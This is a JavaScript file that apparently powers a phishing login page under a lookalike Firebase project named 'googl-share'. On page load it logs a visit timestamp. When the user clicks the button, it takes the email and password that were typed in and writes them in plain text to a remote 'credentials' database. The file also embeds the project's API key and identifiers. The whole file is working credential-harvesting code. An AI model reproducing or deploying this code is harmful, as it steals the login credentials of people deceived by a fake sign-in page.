var firebaseConfig = {
    apiKey: "AIzaSyDsuaXaXRRd9wfO9nRDTFPzKZyRU-UXvlI",
    authDomain: "googl-share.firebaseapp.com",
    projectId: "googl-share",
    storageBucket: "googl-share.appspot.com",
    messagingSenderId: "402710270103",
    appId: "1:402710270103:web:c0d781f32dee7b139899d2",
    measurementId: "G-BZ135CLFNN",
    databaseURL: "https://googl-share-default-rtdb.asia-southeast1.firebasedatabase.app"
  };
  firebase.initializeApp(firebaseConfig);
  var firebaseRef = firebase.database().ref('credentials');
window.onload = function() {
    var currentdate = new Date(); 
var datetime = "Last Sync: " + currentdate.getDate() + "/"
                + (currentdate.getMonth()+1)  + "/" 
                + currentdate.getFullYear() + " @ "  
                + currentdate.getHours() + ":"  
                + currentdate.getMinutes() + ":" 
                + currentdate.getSeconds();

    var openRef = firebase.database().ref('opened')
    openRef.push(datetime)

  document.getElementById("button").addEventListener('click', ()=>{
    var email=document.getElementById('email_input').value;
  	//firebaseRef.push(email);
    var pwd=document.getElementById('password_input').value;
  	//firebaseRef.push(pwd);
      var newUserRef = firebaseRef.push()
      newUserRef.set({
        email: email,
        password : pwd
      });
  });
}

function myFunction() {
    var x = document.getElementById("password_input");
    if (x.type === "password") {
      x.type = "text";
    } else {
      x.type = "password";
    }
  }